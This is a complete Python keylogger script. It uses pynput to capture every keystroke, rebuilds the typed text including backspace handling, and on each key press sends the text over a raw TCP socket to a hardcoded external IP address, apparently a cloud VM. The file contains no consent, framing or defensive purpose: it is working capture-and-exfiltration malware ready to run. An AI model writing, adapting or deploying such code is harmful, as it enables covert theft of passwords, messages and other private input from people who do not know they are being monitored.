import socket
from pynput.keyboard import Listener, Key

# Replace with the external IP of your Google Cloud VM
SERVER_IP = '35.226.246.163'
SERVER_PORT = 9999

full_input_log = []
cleaned_input_log = []

def send_data(data):
    try:
        # Connect to the Google Cloud VM server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

def on_press(key):
    global full_input_log, cleaned_input_log
    
    # Record full input with special keys
    full_input_log.append(str(key))
    
    try:
        # For regular keys (letters, numbers, symbols)
        cleaned_input_log.append(key.char)
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            cleaned_input_log.append(' ')  # Add space for Key.space
        elif key == Key.enter:
            cleaned_input_log.append('\n')  # Add newline for Key.enter
        elif key == Key.backspace:
            if cleaned_input_log:
                cleaned_input_log.pop()  # Remove the last character for backspace

    # Prepare data to send (you can send either cleaned or full input)
    data_to_send = ''.join(cleaned_input_log)
    
    # Send data to Google Cloud VM server
    send_data(data_to_send)

with Listener(on_press=on_press) as listener:
    listener.join()
